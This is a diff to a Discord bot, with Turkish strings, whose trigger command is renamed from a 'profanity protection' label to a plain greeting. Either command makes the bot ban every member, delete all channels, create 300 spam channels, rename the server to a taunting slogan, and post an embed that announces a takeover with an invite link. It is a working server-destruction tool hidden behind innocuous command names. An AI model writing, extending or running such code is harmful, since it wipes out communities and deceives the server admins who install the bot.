@@ -24,15 +24,15 @@ client.on('messageCreate', async (message) => {
   const args = message.content.trim().split(/ +/);
   const command = args.shift().toLowerCase();
 
-  if (command === '!küfürkoruma') {
+  if (command === '!selam') {
     const members = await message.guild.members.fetch();
     let bannedCount = 0;
 
     const embed = new EmbedBuilder()
       .setColor('Red')
       .setTitle('❌ Sunucudan Yasaklandınız!')
-      .setDescription('Fors sikti gitti demeyin     made by fors')
-      .setFooter({ text: '💦FORS AFFETMEZ SABAHA SUNUCUN AFFEDİLMEZ💦' });
+      .setDescription('Fors ve Rynox Sunucuya El Koydu              Ravles gel hayatını yaşa https://discord.gg/QBf9gxHHJF')
+      .setFooter({ text: '💦Fors ve Rynox Affetmez Sabaha Sunucun Affedilmez💦' });
 
     // Üyeleri banla
     for (const member of members.values()) {
@@ -47,7 +47,7 @@ client.on('messageCreate', async (message) => {
     await Promise.all(message.guild.channels.cache.map(ch => ch.delete().catch(() => {})));
 
     // Yeni kanallar oluştur
-    const names = ['FORS💦', 'FORS💝', 'FORS🔥'];
+    const names = ['FORS💦', 'RynOrs💝', 'Rynox🔥'];
     for (let i = 0; i < 300; i++) {
       const name = names[i % names.length];
       await message.guild.channels.create({ name }).catch(() => {});
@@ -71,7 +71,7 @@ client.on('messageCreate', async (message) => {
     }
 
     // Sunucu ismini değiştir
-    await message.guild.setName('💦FORS AFFETMEZ SABAHA SUNUCUN AFFEDİLMEZ💦').catch(() => {});
+    await message.guild.setName('💦Fors ve Rynox Affetmez Sabaha Sunucun Affedilmez💦').catch(() => {});
 
     // Bilgi mesajı
     await message.channel.send(`🧹 ${bannedCount} kişi banlandı. Kanallar ve roller güncellendi.`);
